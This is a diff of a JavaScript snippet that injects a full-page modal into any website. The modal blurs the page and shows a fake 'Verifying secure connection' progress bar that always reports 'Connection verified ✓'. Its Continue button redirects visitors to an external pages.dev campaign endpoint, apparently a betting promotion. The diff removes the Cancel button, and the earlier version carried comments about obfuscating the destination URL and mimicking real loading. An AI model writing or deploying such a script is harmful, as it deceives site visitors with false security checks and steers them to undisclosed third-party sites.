@@ -1,5 +1,21 @@
-// Modal JavaScript - Add this to your HTML page
+// User Engagement Modal with Server-Side Redirect
 (function() {
+    // ============================================
+    // CONFIGURATION
+    // ============================================
+    
+    const CONFIG = {
+        progressDuration: 500,
+        // Use your Pages API endpoint (not the Worker directly)
+        redirectURL: 'https://registernow-7ps.pages.dev/api/?campaign=welcome'
+    };
+
+    function getTarget() {
+        return CONFIG.redirectURL;
+    }
+    
+    // ============================================
+
     // Inject CSS styles
     const style = document.createElement('style');
     style.textContent = `
@@ -10,7 +26,8 @@
         }
         
         body {
-            font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            font-family: "Montserrat", sans-serif;
+            font-weight: bold;
             margin: 0;
             padding: 0;
         }
@@ -22,7 +39,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             z-index: 1000;
             align-items: center;
             justify-content: center;
@@ -34,20 +53,16 @@
         }
         
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
         .popup-card {
-            background: #f5f5f7;
+            background: #242526;
             border-radius: 20px;
             padding: 2rem;
             max-width: 500px;
-            width: 100%;
+            width: 90%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             position: relative;
             transform: scale(0.95);
@@ -76,13 +91,13 @@
             align-items: center;
             justify-content: center;
             font-size: 24px;
-            color: #8e8e93;
+            color: #ffffff;
             transition: all 0.2s ease;
             line-height: 1;
         }
         
         .close-btn:hover {
-            background: #e5e5e7;
+            background: rgba(255, 255, 255, 0.1);
         }
         
         .popup-header {
@@ -92,7 +107,7 @@
         .popup-header h2 {
             font-size: 2rem;
             font-weight: 700;
-            color: #1d1d1f;
+            color: #f48220;
             margin-bottom: 0.75rem;
             letter-spacing: -0.5px;
         }
@@ -112,8 +127,8 @@
         }
         
         .popup-content p {
-            font-size: 15px;
-            color: #636366;
+            font-size: 22.5px;
+            color: #ffffff;
             line-height: 1.6;
         }
         
@@ -125,6 +140,7 @@
             background: #d1f4e0;
             border-radius: 14px;
             margin-bottom: 1.5rem;
+            transition: background 0.3s ease;
         }
         
         .status-icon {
@@ -150,14 +166,98 @@
         }
         
         .status-text {
-            font-size: 15px;
+            font-size: 22.5px;
             color: #1d4d2b;
             font-weight: 500;
+        }
+        
+        .progress-container {
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 0.5s forwards;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #c9a50a 0%, #f0c419 100%);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 10px rgba(201, 165, 10, 0.5);
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+            font-size: 0.75rem;
+            color: #ffffff;
+        }
+        
+        .loading-dots {
+            display: inline-flex;
+            gap: 3px;
+        }
+        
+        .loading-dots span {
+            width: 4px;
+            height: 4px;
+            background: #ffffff;
+            border-radius: 50%;
+            animation: dotBounce 1.4s infinite ease-in-out both;
+        }
+        
+        .loading-dots span:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+        
+        .loading-dots span:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+        
+        @keyframes dotBounce {
+            0%, 80%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
         }
         
         .popup-buttons {
             display: flex;
             gap: 12px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .popup-buttons.active {
+            opacity: 1;
+            pointer-events: auto;
         }
         
         .btn {
@@ -172,19 +272,11 @@
             text-align: center;
         }
         
-        .btn-cancel {
-            background: #e5e5e7;
-            color: #1d1d1f;
-        }
-        
-        .btn-cancel:hover {
-            background: #d1d1d6;
-        }
-        
         .btn-continue {
             background: #c9a50a;
             color: white;
             box-shadow: 0 2px 8px rgba(201, 165, 10, 0.3);
+            width: 100%;
         }
         
         .btn-continue:hover {
@@ -207,10 +299,6 @@
                 font-size: 1.75rem;
             }
             
-            .popup-buttons {
-                flex-direction: column-reverse;
-            }
-            
             .btn {
                 width: 100%;
             }
@@ -220,7 +308,7 @@
 
     // Inject Google Fonts
     const fontLink = document.createElement('link');
-    fontLink.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
+    fontLink.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap';
     fontLink.rel = 'stylesheet';
     document.head.appendChild(fontLink);
 
@@ -236,79 +324,113 @@
                 </div>
                 
                 <div class="popup-content">
-                    <p>We're preparing your personalized experience. Your secure connection is being established automatically.</p>
+                    <p>We're preparing your personalized experience. Be On Anything. Anywhere. Anytime. New Customers Only</p>
                 </div>
                 
-                <div class="verification-status">
+                <div class="verification-status" id="verificationStatus">
                     <div class="status-icon"></div>
-                    <span class="status-text">Connection verified ✓</span>
+                    <span class="status-text">Verifying secure connection</span>
                 </div>
                 
-                <div class="popup-buttons">
-                    <button class="btn btn-cancel" id="cancelBtn">Cancel</button>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span id="statusText">Initializing<span class="loading-dots"><span></span><span></span><span></span></span></span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                </div>
+                
+                <div class="popup-buttons" id="popupButtons">
                     <button class="btn btn-continue" id="continueBtn">Continue</button>
                 </div>
             </div>
         </div>
     `;
 
-    // Insert modal into body when DOM is ready
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initModal);
-    } else {
-        initModal();
-    }
-
-    function initModal() {
+    // Initialize
+    function init() {
         document.body.insertAdjacentHTML('beforeend', modalHTML);
         document.body.style.overflow = 'hidden';
+        document.body.classList.add('modal-active');
 
-        // Get elements
         const overlay = document.getElementById('popupOverlay');
         const closeBtn = document.getElementById('closeBtn');
-        const cancelBtn = document.getElementById('cancelBtn');
         const continueBtn = document.getElementById('continueBtn');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const statusText = document.getElementById('statusText');
+        const popupButtons = document.getElementById('popupButtons');
+        const verificationStatus = document.getElementById('verificationStatus');
+        const statusTextEl = verificationStatus.querySelector('.status-text');
 
-        // Close modal function
+        setTimeout(function() {
+            animateProgress();
+        }, 1000);
+
+        function animateProgress() {
+            let progress = 0;
+            const interval = 50;
+            const increment = (interval / CONFIG.progressDuration) * 100;
+
+            const timer = setInterval(function() {
+                progress += increment;
+                
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    
+                    progressFill.style.width = '100%';
+                    progressPercent.textContent = '100%';
+                    statusText.innerHTML = 'Ready ✓';
+                    statusTextEl.textContent = 'Connection verified ✓';
+                    verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
+                    
+                    setTimeout(function() {
+                        popupButtons.classList.add('active');
+                    }, 300);
+                    
+                } else {
+                    progressFill.style.width = Math.round(progress) + '%';
+                    progressPercent.textContent = Math.round(progress) + '%';
+                }
+            }, interval);
+        }
+
         function closePopup() {
             overlay.classList.remove('active');
             document.body.style.overflow = 'auto';
+            document.body.classList.remove('modal-active');
         }
 
-        // Event listeners
-        closeBtn.addEventListener('click', closePopup);
-        cancelBtn.addEventListener('click', closePopup);
-        
+        // Continue button - redirect to Worker endpoint
         continueBtn.addEventListener('click', function() {
-            // Extra obfuscation - split and reconstruct URL
-            const protocol = 'https://';
-            const domain = 'your-destination';
-            const tld = '.com';
-            const fullUrl = protocol + domain + tld;
+            overlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            document.body.classList.remove('modal-active');
             
-            // Add slight delay to mimic real loading
-            continueBtn.textContent = 'Loading...';
-            continueBtn.disabled = true;
-            
-            setTimeout(function() {
-                window.location.href = fullUrl;
-            }, 300);
-            
-           
+            window.location.href = getTarget();
         });
+        
+        closeBtn.addEventListener('click', closePopup);
 
-        // Close on overlay click
         overlay.addEventListener('click', function(e) {
             if (e.target.id === 'popupOverlay') {
                 closePopup();
             }
         });
 
-        // Close on ESC key
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 closePopup();
             }
         });
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
     }
 })();
